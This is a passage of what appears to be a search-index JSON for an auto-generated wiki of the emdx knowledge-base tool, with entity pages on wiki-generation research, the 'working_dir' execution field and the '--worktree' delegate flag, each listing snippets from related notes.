importance</li> <li> <p>Title scaffolding as proxy for \"what's the singl...</p> </li> <li> <p>#6740 Academic Tool Research: Connected Papers &amp; Graph Visualization for Wiki Generation</p> </li> </ul>"},{"location":"entities/wiki-generation/#academic-graph-visualization-tools-research-for-wiki-generation","title":"Academic Graph Visualization Tools \u2014 Research for Wiki Generation","text":""},{"location":"entities/wiki-generation/#1-connected-papers-the-similarity-graph-algorithm","title":"1. Connected Papers: The Similarity Graph Algorithm","text":""},{"location":"entities/wiki-generation/#how-it-works-not-a-citation-tree","title":"How It Works (Not a Citation Tree)","text":"<p>Connected Papers explicitly does not build citation trees.</p> <ul> <li>#6729 Wiki Generation Architecture Research [1/10] <p>Saved as #6723. Here's the research summary:</p> </li> </ul>"},{"location":"entities/wiki-generation/#topic-clustering-for-auto-wiki-generation-research-summary","title":"Topic Clustering for Auto-Wiki Generation \u2014 Research Summary","text":""},{"location":"entities/wiki-generation/#your-data-measured","title":"Your Data (Measured)","text":"<ul> <li>655 docs with entities, 604 with 384-dim embeddings</li> <li> <p>24K entities, but 82% appear in only 1 d...</p> </li> <li> <p>#6723 Wiki Generation Architecture Research \u2014 Topic Clustering Algorithms   Section: Label Propagation</p> <p>...NOT recommended for this use case -- instability is a problem for reproducible wiki generation</p> </li> <li> <p>#6720 wiki-privacy-research   Section: Recommended Architecture: Three-Layer Filter Pipeline</p> <p>...mpt-engineered synthesis -- handles nuance |  (Synthesis Gate)   |  Filters during wiki generation +--------+-----------+          |          v +--------------------+ |  Layer 3: Post-proc |  Automated review + flagging -- catches LLM misses |  (Review/Flag)...</p> </li> <li> <p>#6714 Wiki Generation Architecture Research [10/10]   Section: Recommendation: New top-level <code>emdx wiki</code> command group</p> <p>Not <code>emdx maintain wiki</code> \u2014 maintain is for cleanup/repair operations (compact, cleanup, link, wikify, entities). Wiki generation is a creative output operation, closer to <code>distill</code> or <code>explore</code> than to <code>maintain</code>.</p> </li> <li> <p>#6712 wiki-research</p> </li> </ul>"},{"location":"entities/wiki-generation/#wiki-generation-architecture-research-notion-wiki-logseq-knowledge-graph","title":"Wiki Generation Architecture Research: Notion Wiki &amp; Logseq Knowledge Graph","text":""},{"location":"entities/wiki-generation/#notion-wiki-feature-launched-april-2023","title":"Notion Wiki Feature (launched April 2023)","text":""},{"location":"entities/wiki-generation/#1-how-wiki-pages-are-organized","title":"1. How Wiki Pages Are Organized","text":"<p>Notion's wiki is built on a dual-nature architecture: every wiki is simultaneously a...</p>"},{"location":"entities/wiki-generation/#related-entities","title":"Related Entities","text":"<ul> <li><code>research summary</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.8)</li> <li><code>what:</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>what auto</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>strange new worlds plugin</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>spectral clustering</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>patterns most relevant</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>passive wikification</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>obsidian publish &amp; wiki generation ux research</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>manual:</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>label propagation</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> </ul>"},{"location":"entities/workingdir/","title":"working_dir","text":"<p>Type: tech_term | Mentioned in: 9 documents | First seen: 2026-02-13</p>"},{"location":"entities/workingdir/#documents-9","title":"Documents (9)","text":"<ul> <li> <p>#6708 Delegate: Analyze how running delegates are tracked in the database. R [3/4]   Section: The <code>executions</code> Table Schema (final form)</p> <p>...| | <code>exit_code</code> | INTEGER (nullable) | Process exit code (NULL while running) | | <code>working_dir</code> | TEXT (nullable) | Working directory / worktree path | | <code>pid</code> | INTEGER (nullable) | OS process ID | | <code>cascade_run_id</code> | INTEGER (nullable) | FK to cascade_runs...</p> </li> <li> <p>#6515 Any removal Phase 2: UI TypedDicts   Section: 1. Created <code>emdx/ui/types.py</code></p> <ul> <li><code>AgentExecutionDict</code>: Agent execution data used by <code>AgentExecutionItem</code> in the activity view. Fields include <code>id</code>, <code>doc_id</code>, <code>doc_title</code>, <code>status</code>, <code>started_at</code>, <code>completed_at</code>, <code>log_file</code>, <code>exit_code</code>, <code>working_dir</code>, <code>cost_usd</code>, <code>tokens_used</code>.</li> </ul> </li> <li> <p>#6502 None Type Analysis [1/7]   Section: emdx/commands/delegate.py</p> </li> </ul> <pre><code>def _make_output_file_id(working_dir: str | None, seq: int | None) -&gt; str:\n</code></pre> <p>Verdict: NECESSARY - <code>working_dir</code>: Checked with <code>if working_dir:</code> \u2014 can be None when no worktree. - <code>seq</code>: Used with `...</p> <ul> <li>#6494 None Type Analysis [5/7]   Section: base.py (cli_executor/base.py) </li> <li> <p>These are legitimately optional parameters with defaults/fallbacks</p> </li> <li> <p>#6482 Delegate: Kink 6: Add basic PR validation to emdx/commands/delegate.py [3/3]   Section: 1. <code>emdx/utils/git.py</code> - Added <code>validate_pr_preconditions()</code> function</p> <p><code>python def validate_pr_preconditions(     working_dir: str | None = None,     base_branch: str = \"main\", ) -&gt; dict[str, bool | str | None]:</code></p> </li> <li> <p>#6192 Delegate: Investigate the activity browser behavior when showing deleg [1/3]   Section: delegate.py - Execution Creation Flow</p> <p>...itle,       # e.g., \"Delegate: analyze auth\"        log_file=str(log_file),        working_dir=config.working_dir,    )    ```</p> </li> <li> <p>#6170 Delegate: Analyze the task execution tracking system. Read emdx/models [9/15]   Section: 1. Executions Table (<code>models/executions.py</code>)</p> <p>...file<code>| TEXT | Path to log file | |</code>exit_code<code>| INTEGER | Process exit code | |</code>working_dir<code>| TEXT | Working directory | |</code>pid<code>| INTEGER | Process ID for zombie detection | |</code>last_heartbeat` | TIMESTAMP | For stale detection |</p> </li> <li> <p>#6160 Delegate: Analyze how tasks integrate with delegate. Read emdx/command [4/15]   Section: Overlap Between Delegate's Task Tracking and Task System</p> </li> <li><code>log_file</code> \u2014 path to execution log</li> <li><code>working_dir</code>, <code>pid</code> \u2014 runtime info</li> <li><code>last_heartbeat</code> \u2014 liveness tracking</li> </ul>"},{"location":"entities/workingdir/#function-_make_output_file_id-line-178","title":"Function: <code>_make_output_file_id</code> (line 178)","text":""},{"location":"entities/workingdir/#lines-71-75-in-build_command-model-allowed_tools-working_dir-timeout","title":"Lines 71-75 in <code>build_command</code>: <code>model</code>, <code>allowed_tools</code>, <code>working_dir</code>, <code>timeout</code>","text":"<p>Status: ALL NECESSARY</p>"},{"location":"entities/workingdir/#execution-specific-fields-not-in-tasks","title":"Execution-Specific Fields (not in tasks):","text":""},{"location":"entities/workingdir/#related-entities","title":"Related Entities","text":"<ul> <li><code>doc_title</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.6)</li> <li><code>validate_pr_preconditions()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.6)</li> <li><code>verdict: necessary (both)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>verdict: necessary (both param and return)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>verdict: n/a</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>verdict: both necessary</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>typer command:</code>view<code>(lines 772-852)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>typer command:</code>save<code>(lines 186-337)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>typer command:</code>find<code>(lines 340-551)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>typer command:</code>edit<code>(lines 928-1043)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> </ul>"},{"location":"entities/worktree/","title":"--worktree","text":"<p>Type: tech_term | Mentioned in: 14 documents | First seen: 2026-02-13</p>"},{"location":"entities/worktree/#documents-14","title":"Documents (14)","text":"<ul> <li> <p>#6825 Delegate: --help [2/2]   Section: Options</p> <p>...use as input context | | <code>--pr</code> | \u2014 | \u2014 | Instruct agent to create a PR (implies <code>--worktree</code>) | | <code>--branch</code> | \u2014 | \u2014 | Commit and push to origin branch (implies <code>--worktree</code>, no PR) | | <code>--draft</code> / <code>--no-draft</code> | \u2014 | \u2014 | Create PR as draft (default: `--no-d...</p> </li> <li> <p>#6789 Delegate: --help [2/2]</p> <p>...lp`</p> </li> <li>Grouped option panels \u2014 Git/PR options (<code>--pr</code>, <code>--branch</code>, <code>--draft</code>, <code>--worktree</code>, <code>--base-branch</code>) are grouped under \"Git &amp; PRs\", and <code>--epic</code>/<code>--cat</code> under \"Organization\"</li> <li> <p>Concise option descriptions \u2014 Trimmed verbose help strings (e.g. \"...</p> </li> <li> <p>#6788 Delegate: --help [2/2]</p> <p>...r app</p> </li> <li>Grouped option panels \u2014 Git/PR flags (<code>--pr</code>, <code>--branch</code>, <code>--draft</code>, <code>--worktree</code>, <code>--base-branch</code>) are under \"Git &amp; PRs\"; organization flags (<code>--epic</code>, <code>--cat</code>) are under \"Organization\"</li> <li> <p>Concise help strings \u2014 Every option description was...</p> </li> <li> <p>#6787 Delegate: list [1/2]</p> <p>...yper app</p> </li> <li>Added <code>rich_help_panel=\"Git &amp; PRs\"</code> for <code>--pr</code>, <code>--branch</code>, <code>--draft</code>, <code>--worktree</code>, <code>--base-branch</code></li> <li>Added <code>rich_help_panel=\"Organization\"</code> for <code>--epic</code>, <code>--cat</code></li> <li> <p>Tightened all option help strings to be more concise</p> </li> <li> <p>#6785 Delegate: --help [2/2]   Section: Changes</p> <p>...th <code>rich_help_panel</code>**:</p> </li> <li>\"Git &amp; PRs\" panel: <code>--pr</code>, <code>--branch</code>, <code>--draft</code>, <code>--worktree</code>, <code>--base-branch</code></li> <li>\"Organization\" panel: <code>--epic</code>, <code>--cat</code></li> <li> <p>Improved option descriptions \u2014 cleaner, more concise text (e.g. \"Inject document content as c...</p> </li> <li> <p>#6758 Delegate: Research how to get progress/status information from a runni   Section: 5. Worktree Monitoring as a Proxy</p> <p>For <code>--worktree</code> delegates, monitoring <code>git status</code> or <code>git diff --stat</code> in the worktree dir would show:</p> </li> <li>Files modified/added/deleted</li> <li>Whether commits have been made</li> <li> <p>Whether a branch was pushed</p> </li> <li> <p>#6678 Delegate Slimming Research [1/3]   Section: (B) MUST STAY IN LAUNCHER \u2014 Hooks can't do these</p> <p>...pr<code>,</code>--branch<code>,</code>--model<code>,</code>--tags<code>,</code>--synthesize<code>,</code>--doc<code>,</code>--epic<code>,</code>--cat<code>,</code>--worktree<code>,</code>--draft<code>,</code>--jobs<code>,</code>--cleanup`, mutual exclusivity checks. This is the entry point \u2014 hooks have no CLI. | | 2 | Parallel orchestration (ThreadPoolExecutor) |...</p> </li> <li> <p>#6567 Delegate synthesis [synthesis]   Section: 5. Git Integration</p> <ul> <li><code>--worktree</code>: Isolated execution environment</li> </ul> </li> <li><code>--branch</code>: Push branch without PR (worktree retained)</li> <li><code>--pr</code>: Create PR after changes (worktree cleaned up)</li> <li><code>--draft</code>: Create as draft PR</li> <li> <p><code>--base-branch</code>: Custom base for worktree</p> </li> <li> <p>#6565 Delegate: Look at the synthesis_service.py \u2014 how does --synthesize wor [3/3]   Section: 2. Parallel Execution (_run_parallel, lines 636-861)</p> <p>Each task:</p> </li> <li>Gets an optional per-task worktree (if <code>--worktree</code>)</li> <li>Runs via <code>_run_single()</code> which calls <code>UnifiedExecutor</code></li> <li> <p>Returns a <code>SingleResult</code> with <code>doc_id</code>, <code>task_id</code>, <code>pr_url</code>, etc.</p> </li> <li> <p>#6564 Delegate: Analyze the emdx delegate command implementation in emdx/com [1/3]   Section: Git Integration Options</p> Flag Short Description <code>--worktree</code> <code>-w</code> Run in isolated git worktree <code>--pr</code> \u2014 Create a PR after changes (implies <code>--worktree</code>) <code>--branch</code> \u2014 Push branch without creating PR (implie... </li> <li> <p>#6535 EMDX Future Directions: Agent-First Design [4/4]   Section: What Works Well Today</p> <p>...KB content to agents; results persist back to KB</p> </li> <li> <p>PR Automation: <code>--pr</code> and <code>--worktree</code> flags enable isolated, parallel code changes</p> </li> <li> <p>#6395 Delegate: Analyze how EMDX is used differently by humans vs AI agents. [1/3]   Section: 6. WORKFLOW DIFFERENCES</p> <p>...ial (<code>--chain</code>), and discovery (<code>--each</code>)</p> </li> <li>Creates PRs (<code>--pr</code>), uses worktrees (<code>--worktree</code>)</li> <li> <p>Key insight: Agents are invoked by delegate, not running interactively</p> </li> <li> <p>#6294 DEBT-19: Add missing test coverage for delegate command   Section: Test Coverage Added</p> <p>...n` flag</p> </li> <li><code>--each/--do</code> flags for dynamic discovery</li> <li><code>--synthesize</code> flag</li> <li><code>--worktree</code> flag</li> <li><code>--pr</code> flag (implies worktree)</li> <li><code>--doc</code> flag for document context</li> <li> <p>Error handling (no tasks, mutually exclusive flags)</p> </li> <li> <p>#6191 Delegate: analysis [3/3]   Section: Key Features</p> <p>...R creation**: <code>--pr</code> instructs agent to create pull requests</p> </li> <li>Git worktrees: <code>--worktree</code> provides isolated environments</li> <li>Dynamic discovery: <code>--each \"fd -e py\" --do \"Review {{item}}\"</code></li> </ul>"},{"location":"entities/worktree/#related-entities","title":"Related Entities","text":"<ul> <li><code>--base-branch</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (7 shared docs, PMI=5.9)</li> <li><code>--jobs</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.9)</li> <li><code>--cleanup</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.9)</li> <li><code>key implementation details</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.9)</li> <li><code>grouped option panels</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.9)</li> <li><code>--branch</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (8 shared docs, PMI=5.8)</li> <li><code>use sonnet</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.5)</li> <li><code>threadpoolexecutor</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.5)</li> <li><code>dynamic discovery</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.5)</li> <li><code>--epic</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (7 shared docs, PMI=5.4)</li> </ul>"}]}